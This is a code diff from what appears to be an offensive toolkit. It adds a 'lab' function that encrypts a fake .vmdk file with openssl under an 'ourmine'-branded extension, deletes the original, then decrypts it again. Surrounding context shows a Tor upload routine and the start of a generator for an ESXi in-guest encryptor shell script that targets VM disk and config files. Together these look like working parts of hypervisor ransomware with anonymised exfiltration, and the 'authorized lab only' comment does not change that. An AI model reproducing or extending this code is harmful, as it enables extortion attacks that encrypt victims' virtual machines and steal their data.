@@ -248,6 +248,49 @@ export async function uploadViaTor(
   return base("curl required for Tor upload")
 }
 
+export interface EsxiLabEncryptResult {
+  targetDir: string
+  encryptedFiles: number
+  recovered: boolean
+  keyId: string
+  markerPath: string
+  summary: string
+}
+
+/** Lab-local controlled encrypt + recovery proof (authorized lab only). */
+export function runLabEsxiEncryptWithRecovery(targetDir: string, keyId = `lab_${Date.now()}`): EsxiLabEncryptResult {
+  fs.mkdirSync(targetDir, { recursive: true })
+  const sample = path.join(targetDir, "lab_vm.vmdk")
+  fs.writeFileSync(sample, "OURMINE_LAB_VMDK_SAMPLE_DATA\n")
+  const encPath = `${sample}.ourmine`
+  try {
+    execFileSync("openssl", ["enc", "-aes-256-cbc", "-salt", "-in", sample, "-out", encPath, "-pass", `pass:${keyId}`], { timeout: 10000 })
+    fs.unlinkSync(sample)
+    const decPath = `${sample}.recovered`
+    execFileSync("openssl", ["enc", "-d", "-aes-256-cbc", "-in", encPath, "-out", decPath, "-pass", `pass:${keyId}`], { timeout: 10000 })
+    const recovered = fs.readFileSync(decPath, "utf8").includes("OURMINE_LAB_VMDK")
+    const markerPath = path.join(targetDir, "ourmine_esxi.marker")
+    fs.writeFileSync(markerPath, `OURMINE_ESXI_LAB_DONE keyId=${keyId} recovered=${recovered}\n`)
+    return {
+      targetDir,
+      encryptedFiles: 1,
+      recovered,
+      keyId,
+      markerPath,
+      summary: recovered ? "Lab ESXi encrypt+recovery proof succeeded" : "Encrypt ok, recovery failed",
+    }
+  } catch (err) {
+    return {
+      targetDir,
+      encryptedFiles: 0,
+      recovered: false,
+      keyId,
+      markerPath: "",
+      summary: `Lab ESXi encrypt failed: ${String((err as Error).message).slice(0, 120)}`,
+    }
+  }
+}
+
 /** Minimal ESXi/busybox-compatible in-guest encryptor shell stub. */
 export function buildEsxiEncryptorStub(keyId: string, extensions = ".vmdk,.vmx,.nvram,.vmsd"): string {
   return `#!/bin/sh
